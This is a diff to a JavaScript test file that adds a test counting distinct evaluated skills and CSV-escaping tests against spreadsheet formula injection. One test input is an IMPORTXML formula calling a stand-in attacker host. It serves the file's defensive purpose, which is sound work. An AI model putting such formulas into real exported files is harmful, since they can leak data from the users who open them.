@@ -104,6 +104,23 @@ test('evidence confidence is derived from response depth and skill breadth', () 
   assert.equal(deep <= 0.95, true);
 });
 
+test('evidence confidence counts distinct evaluated skills only', () => {
+  const history = [
+    { role: 'agent', message: 'Pregunta' },
+    { role: 'user', message: 'Respuesta con detalles tecnicos suficientes para estimar profundidad.' }
+  ];
+  const duplicateBreadth = calculateEvidenceConfidence(history, [
+    { skillKey: 'TESTING_STRATEGY' },
+    { skillKey: 'TESTING_STRATEGY' },
+    { skillKey: 'TESTING_STRATEGY' }
+  ]);
+  const singleBreadth = calculateEvidenceConfidence(history, [
+    { skillKey: 'TESTING_STRATEGY' }
+  ]);
+
+  assert.equal(duplicateBreadth, singleBreadth);
+});
+
 test('history normalization removes empty or malformed turns', () => {
   assert.deepEqual(normalizeHistory([
     { role: 'user', message: '  respuesta ' },
@@ -202,4 +219,6 @@ test('CSV escaping protects quotes and newlines', () => {
   assert.equal(csvEscape('a,b'), '"a,b"');
   assert.equal(csvEscape('a"b'), '"a""b"');
   assert.equal(csvEscape('a\nb'), '"a\nb"');
+  assert.equal(csvEscape('=IMPORTXML("http://evil.example")'), `"'=IMPORTXML(""http://evil.example"")"`);
+  assert.equal(csvEscape('@SUM(1,2)'), `"'@SUM(1,2)"`);
 });
